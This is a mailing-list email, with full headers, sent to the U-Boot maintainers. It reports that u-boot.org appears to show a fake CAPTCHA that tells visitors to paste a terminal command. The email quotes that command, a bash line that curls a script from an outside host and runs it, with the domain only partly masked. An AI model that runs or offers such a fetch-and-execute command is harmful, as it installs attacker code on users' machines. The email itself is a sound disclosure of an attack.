Return-Path: <u-boot-bounces@lists.denx.de>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from phobos.denx.de (phobos.denx.de [85.214.62.61])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 94990E98E0F
	for <u-boot@archiver.kernel.org>; Mon, 23 Feb 2026 10:02:24 +0000 (UTC)
Received: from h2850616.stratoserver.net (localhost [IPv6:::1])
	by phobos.denx.de (Postfix) with ESMTP id B2B2183BC9;
	Mon, 23 Feb 2026 11:02:22 +0100 (CET)
Authentication-Results: phobos.denx.de; dmarc=none (p=none dis=none) header.from=mkukri.xyz
Authentication-Results: phobos.denx.de; spf=pass smtp.mailfrom=u-boot-bounces@lists.denx.de
Authentication-Results: phobos.denx.de;
	dkim=fail reason="signature verification failed" (1024-bit key; unprotected) header.d=servermx.com header.i=@servermx.com header.b="Dw5IxERt";
	dkim=fail reason="signature verification failed" (1024-bit key) header.d=servermx.com header.i=@servermx.com header.b="Dw5IxERt";
	dkim-atps=neutral
Received: by phobos.denx.de (Postfix, from userid 109)
 id 89F8683D0F; Mon, 23 Feb 2026 06:29:55 +0100 (CET)
Received: from ns13.servermx.com (ns13.servermx.com [135.125.234.2])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits))
 (No client certificate requested)
 by phobos.denx.de (Postfix) with ESMTPS id 9D8DD80050
 for <u-boot@lists.denx.de>; Mon, 23 Feb 2026 06:29:53 +0100 (CET)
Authentication-Results: phobos.denx.de;
 dmarc=none (p=none dis=none) header.from=mkukri.xyz
Authentication-Results: phobos.denx.de; spf=pass smtp.mailfrom=km@mkukri.xyz
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=servermx.com; s=servermx; h=To:Date:Message-Id:Subject:Mime-Version:
 Content-Transfer-Encoding:Content-Type:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=ZhpR8j04MSYGWR+LKUT51pScCTiKterG6PGA9cGZZVw=; b=Dw5IxERtG1CiN9FllPMP9/5CFG
 kQoVHr438lfH/HbhJcLQUwdQNRZd5Ta0QGQLBBoKskGqEs5bitMTbZNrBx24uP/OCdEZaeJFUeS6T
 P32R6omzlyq8FVWor7O2Kjb0MiG8W84Ur4KzYF82vvku5CbgtqzyitCPGVfrvnDqfQos=;
Received: by exim4;
	Mon, 23 Feb 2026 06:29:53 +0100
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=servermx.com; s=servermx; h=To:Date:Message-Id:Subject:Mime-Version:
 Content-Transfer-Encoding:Content-Type:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=ZhpR8j04MSYGWR+LKUT51pScCTiKterG6PGA9cGZZVw=; b=Dw5IxERtG1CiN9FllPMP9/5CFG
 kQoVHr438lfH/HbhJcLQUwdQNRZd5Ta0QGQLBBoKskGqEs5bitMTbZNrBx24uP/OCdEZaeJFUeS6T
 P32R6omzlyq8FVWor7O2Kjb0MiG8W84Ur4KzYF82vvku5CbgtqzyitCPGVfrvnDqfQos=;
Received: by exim4;
	Mon, 23 Feb 2026 06:29:46 +0100
From: Mate Kukri <km@mkukri.xyz>
Content-Type: text/plain;
	charset=utf-8
Content-Transfer-Encoding: quoted-printable
Mime-Version: 1.0 (Mac OS X Mail 16.0 \(3864.300.41.1.7\))
Subject: U-boot.org is spreading malware 
Message-Id: <B5494394-27AB-4A58-9CA1-323B9D629425@mkukri.xyz>
Date: Mon, 23 Feb 2026 05:29:29 +0000
To: u-boot@lists.denx.de
X-Mailer: Apple Mail (2.3864.300.41.1.7)
Feedback-ID: outgoingmessage:mkukri.xyz:ns12.servermx.com:servermx.com
X-Mailman-Approved-At: Mon, 23 Feb 2026 11:02:21 +0100
X-BeenThere: u-boot@lists.denx.de
X-Mailman-Version: 2.1.39
Precedence: list
List-Id: U-Boot discussion <u-boot.lists.denx.de>
List-Unsubscribe: <https://lists.denx.de/options/u-boot>,
 <mailto:u-boot-request@lists.denx.de?subject=unsubscribe>
List-Archive: <https://lists.denx.de/pipermail/u-boot/>
List-Post: <mailto:u-boot@lists.denx.de>
List-Help: <mailto:u-boot-request@lists.denx.de?subject=help>
List-Subscribe: <https://lists.denx.de/listinfo/u-boot>,
 <mailto:u-boot-request@lists.denx.de?subject=subscribe>
Errors-To: u-boot-bounces@lists.denx.de
Sender: "U-Boot" <u-boot-bounces@lists.denx.de>
X-Virus-Scanned: clamav-milter 0.103.8 at phobos.denx.de
X-Virus-Status: Clean

Dear Maintainers,

U-Boot.org seems to be trying to social engineer visitors into executing =
potentially malicious code.

The website presents a seemingly fake re-Captcha upon visiting, which =
after ticking the box instructs the user to open their terminal and =
paste and execute a command from the clipboard for =E2=80=9Cverification".=


Said command curl-s some text from a network server and runs it as a =
bash command.

I have not done much analysis on the exact behaviour of the payload, but =
social engineering users into executing arbitrary local payload is not =
an acceptable way of doing web visitor verification.

An example of the clipboard payload I am told to execute (but did not) =
is (sub XXXXXXXX with microzen)
 /bin/bash -c "$(curl -A 'Mac OS X 10_15_7' -fsSL =
'tl5mltkq.XXXXXXXX.digital/?=3Dcheck&&actmn=3DgTGzPBzHSGwagnVq')"; echo =
""BotGuard: Answer the protector challenge. Ref: 15978=20

Best regards,
Mate Kukri=
